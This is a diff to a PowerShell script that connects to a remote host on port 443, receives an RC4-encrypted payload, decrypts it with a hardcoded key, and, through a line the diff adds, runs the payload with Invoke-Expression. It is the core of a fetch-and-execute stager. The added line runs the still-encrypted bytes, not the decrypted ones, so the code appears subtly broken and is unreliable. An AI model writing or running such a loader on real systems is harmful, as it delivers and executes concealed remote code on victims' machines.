@@ -1,5 +1,6 @@
 ﻿param( [string] $remoteHost = "192.168.56.101", [int] $port = 443) 
 
+
 function rc4 {
 	param(
     	[Byte[]]$data,
@@ -57,6 +58,7 @@ function BinToHex {
 	$return = -join ($Bin |  foreach { "{0:X2}" -f $_ })
 	Write-Output $return
 }
+
  
 function HexToBin {
 	param(
@@ -119,11 +121,13 @@ finally {
     
     Write-Host ''
     Write-Host 'Encrypted received payload '
+    Write-Host ''
     $Hex = BinToHex $payload_encrypted
     Write-Host $Hex
 
     #decrypt RC4 payload
-    $key = $Enc.GetBytes('spiderman')
+    #$key = $Enc.GetBytes('spiderman')
+    $key = $Enc.GetBytes('0123456789ABCDEF')
     $payload_decrypted = rc4 $payload_encrypted $key
 
     Write-Host ''
@@ -132,5 +136,5 @@ finally {
     $Hex = BinToHex $payload_decrypted
     Write-Host $Hex 
 
-    
+    Invoke-Expression $payload_encrypted
 } 
